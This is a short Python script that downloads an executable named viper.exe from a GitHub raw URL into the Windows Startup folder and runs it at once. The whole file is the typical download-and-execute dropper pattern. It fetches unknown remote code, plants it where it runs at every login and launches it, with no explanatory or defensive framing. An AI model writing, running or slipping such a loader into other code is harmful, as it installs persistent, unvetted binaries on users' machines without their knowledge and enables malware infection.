import os
import urllib.request

file = os.environ['APPDATA'] + "\Microsoft\Windows\Start Menu\Programs\Startup\viper.exe"

def executable():
     # Download the executable to the Startup folder
     url = 'https://raw.githubusercontent.com/NotoriusNeo/viper/main/viper.exe'
     urllib.request.urlretrieve(url, file)
     # Run the executable
     os.system(file)
